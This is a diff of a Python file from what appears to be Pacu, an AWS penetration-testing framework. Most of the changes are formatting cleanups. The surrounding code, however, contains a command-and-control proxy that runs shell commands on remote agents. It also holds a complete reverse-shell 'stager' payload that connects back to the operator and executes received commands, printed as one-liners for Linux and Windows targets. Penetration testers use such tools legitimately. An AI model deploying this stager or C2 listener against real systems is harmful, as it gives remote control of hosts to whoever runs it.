@@ -12,13 +12,12 @@ import threading
 import random
 import string
 from queue import Queue
-from functools import partial
 
 import configure_settings
 import settings
 
 from core.models import AWSKey, PacuSession, ProxySettings
-from pacu_proxy import PacuProxy
+from proxy import PacuProxy
 from setup_database import setup_database_if_not_present
 from utils import get_database_connection, set_sigint_handler
 
@@ -41,7 +40,7 @@ def display_help():
             stop                              Stop the PacuProxy listener
             kill <agent_id>                   Kill an agent (stop it from running on the host)
             list/ls                           List info on remote agent(s)
-            use none|<agent_id>               Use a remote agent, identified by unique integers 
+            use none|<agent_id>               Use a remote agent, identified by unique integers
                                                 (use "proxy list" to see them). Choose "none" to
                                                 no longer use any proxy (route from the local
                                                 host instead)
@@ -341,11 +340,13 @@ class util(object):
         with the alias exists, an exception will be raised. """
         return database.query(AWSKey).filter(AWSKey.key_alias == alias).scalar()
 
+
 def start_proxy(queue, database):
     proxy_settings = ProxySettings.get_proxy_settings(database)
     server = create_workers(queue, proxy_settings.ip, proxy_settings.port, database)
     create_jobs(queue)
     return server
+
 
 # Create the proxy threads
 def create_workers(queue, proxy_ip, proxy_port, database):
@@ -357,6 +358,7 @@ def create_workers(queue, proxy_ip, proxy_port, database):
         t.start()
     return server
 
+
 # Handle the next job in queue (one thread handles connections, other sends commands)
 def work(server, queue):
     while True:
@@ -366,13 +368,14 @@ def work(server, queue):
             server.socket_bind()
             server.accept_connections()
         if x == 5:
-            break # Shutdown listener called
+            break  # Shutdown listener called
     queue.task_done()
     return
 
+
 # Fill the queue with jobs
 def create_jobs(queue):
-    for x in [1, 2]: # Job numbers
+    for x in [1, 2]:  # Job numbers
         queue.put(x)
     return
 
@@ -445,7 +448,7 @@ def get_ssh_key(ssh_username, ssh_priv_key, database):
                 subprocess.run('cp {}/id_rsa.pub {}/authorized_keys'.format(ssh_dir, ssh_dir).split(' '))
 
                 util.print('Ensuring that local port forwarding is disabled (to prevent a "hack back" scenario)...', database)
-                replace = ''
+                action = ''
                 with open('/etc/ssh/sshd_config', 'r') as f:
                     contents = f.read()
                     print('contents {}'.format(contents))
@@ -494,7 +497,7 @@ def parse_command(command, server, queue, database):
         proxy_ssh_priv_key = proxy_settings.ssh_priv_key
         proxy_target_agent = copy.deepcopy(proxy_settings.target_agent)
 
-        if len(command) == 1: # Display proxy help
+        if len(command) == 1:  # Display proxy help
             print("""
     PacuProxy command info:
         proxy                               Control PacuProxy/display help
@@ -502,7 +505,7 @@ def parse_command(command, server, queue, database):
             stop                                Stop the PacuProxy listener
             kill <agent_id>                     Kill an agent (stop it from running on the host)
             list/ls                             List info on remote agent(s)
-            use none|<agent_id>                 Use a remote agent, identified by unique integers 
+            use none|<agent_id>                 Use a remote agent, identified by unique integers
                                                   (use "proxy list" to see them). Choose "none" to
                                                   no longer use any proxy (route from the local
                                                   host instead)
@@ -512,7 +515,7 @@ def parse_command(command, server, queue, database):
                                                   (win). The only difference in the payloads is how
                                                   command-line escaping is done for valid syntax.
 """)
-        elif command[1] == 'start': # Start proxy server
+        elif command[1] == 'start':  # Start proxy server
             if len(command) < 3:
                 util.print('You need to pass at least an IP address to proxy start: proxy start <ip> [<port>]', database)
                 return server, queue
@@ -530,14 +533,14 @@ def parse_command(command, server, queue, database):
                 return server, queue
             else:
                 print('There already seems to be a listener running: {}'.format(server))
-        elif command[1] == 'list' or command[1] == 'ls': # List active agent connections
+        elif command[1] == 'list' or command[1] == 'ls':  # List active agent connections
             server.list_connections()
-        elif command[1] == 'shell': # Run shell command on an agent
+        elif command[1] == 'shell':  # Run shell command on an agent
             if len(command) > 3:
                 server.run_cmd(int(command[2]), server.all_connections[int(command[2])], ' '.join(command[3:]))
             else:
                 print('** Incorrect input, expected an agent ID and a shell command. Use the format: proxy shell <agent_id> <shell command> **')
-        elif command[1] == 'stop': # Stop proxy server
+        elif command[1] == 'stop':  # Stop proxy server
             if proxy_listening is False:
                 print('There does not seem to be a listener running currently.')
             else:
@@ -546,7 +549,7 @@ def parse_command(command, server, queue, database):
                 server = None
                 proxy_listening = False
                 proxy_target_agent = []
-        elif command[1] == 'kill': # Kill an agent connection
+        elif command[1] == 'kill':  # Kill an agent connection
             if len(command) == 3:
                 util.print('** Killing agent {}... **'.format(int(command[2])), database)
                 server.quit(int(command[2]), server.all_connections[int(command[2])])
@@ -558,9 +561,9 @@ def parse_command(command, server, queue, database):
         elif command[1] == 'stager':
             if len(command) == 3:
                 python_stager = "import os,socket as E,subprocess as B,time as t,sys,struct as D\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      t.sleep(5)\\n      raise\\n    try:\\n      self.s.send(E.gethostname().encode('ascii'))\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode('ascii')\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while True:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='Err: %s\\\n'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        sys.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=True,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='Err:%s\\\n'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while True:\\n    try:\\n      C.c()\\n    except Exception as e:\\n      t.sleep(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nsys.stderr=object\\nwhile True:\\n  f()".format(proxy_ip, proxy_port)
-                if command[2] == 'lin': # Linux one-liner (uses \" to escape inline double-quotes)
+                if command[2] == 'lin':  # Linux one-liner (uses \" to escape inline double-quotes)
                     util.print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)), database)
-                elif command[2] == 'win': # Windows one-liner (uses `" to escape inline double-quotes)
+                elif command[2] == 'win':  # Windows one-liner (uses `" to escape inline double-quotes)
                     util.print('python3 -c "{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)), database)
                 else:
                     util.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(command[2:]), database)
